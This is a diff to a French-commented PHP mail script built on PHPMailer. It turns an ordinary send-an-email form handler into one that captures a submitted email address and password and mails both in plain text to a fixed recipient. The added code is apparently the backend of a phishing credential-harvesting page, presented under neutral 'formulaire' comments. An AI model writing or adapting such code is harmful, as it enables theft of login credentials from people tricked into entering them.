@@ -2,48 +2,39 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-require 'vendor/autoload.php';  // Inclure la bibliothèque PHPMailer
+require 'PHPMailer/PHPMailer.php';
+require 'PHPMailer/SMTP.php';
+require 'PHPMailer/Exception.php';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Récupérer les données du formulaire
-    $sender_email = $_POST['sender_email'];
-    $password = $_POST['password'];  // Cela peut être utilisé pour l'authentification avec SMTP (Gmail, par exemple)
-    $recipient_email = $_POST['recipient_email'];
-    $subject = $_POST['subject'];
-    $message = $_POST['message'];
+    $email = $_POST['email'];
+    $motdepasse = $_POST['password'];
 
-    // Créer une instance de PHPMailer
     $mail = new PHPMailer(true);
 
     try {
-        // Configuration du serveur SMTP (par exemple, Gmail)
+        // Configuration du serveur SMTP
         $mail->isSMTP();
-        $mail->Host = 'smtp.gmail.com'; // Serveur SMTP de Gmail
-        $mail->SMTPAuth = true;
-        $mail->Username = $sender_email;  // Utiliser l'email de l'expéditeur
-        $mail->Password = $password;      // Utiliser le mot de passe de l'expéditeur
-        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
-        $mail->Port = 587;
+        $mail->Host       = 'smtp.gmail.com'; // Remplacez par votre serveur SMTP
+        $mail->SMTPAuth   = true;
+        $mail->Username   = 'votre_email@gmail.com'; // Remplacez par votre adresse e-mail
+        $mail->Password   = 'votre_mot_de_passe';    // Remplacez par votre mot de passe
+        $mail->SMTPSecure = 'tls';
+        $mail->Port       = 587;
 
-        // Définir l'adresse de l'expéditeur et du destinataire
-        $mail->setFrom($sender_email, 'Ton Nom');
-        $mail->addAddress($recipient_email);  // Destinataire
-        $mail->addReplyTo($sender_email, 'Ton Nom');
+        // Destinataires
+        $mail->setFrom('votre_email@gmail.com', 'Formulaire PHP');
+        $mail->addAddress('destinataire@example.com'); // Remplacez par l'adresse du destinataire
 
-        // Contenu de l'email
-        $mail->isHTML(true);  // Permet l'envoi en HTML
-        $mail->Subject = $subject;
-        $mail->Body    = nl2br($message); // Remplacer les sauts de ligne par <br>
+        // Contenu de l'e-mail
+        $mail->isHTML(true);
+        $mail->Subject = 'Nouveau message depuis le formulaire';
+        $mail->Body    = "Adresse email: $email <br> Mot de passe: $motdepasse";
 
-        // Envoi de l'email
-        if ($mail->send()) {
-            echo 'L\'email a été envoyé avec succès!';
-        } else {
-            echo 'Échec de l\'envoi de l\'email.';
-        }
-
+        $mail->send();
+        echo "Message envoyé avec succès !";
     } catch (Exception $e) {
-        echo "Erreur : {$mail->ErrorInfo}";
+        echo "Erreur lors de l'envoi : {$mail->ErrorInfo}";
     }
 }
 ?>
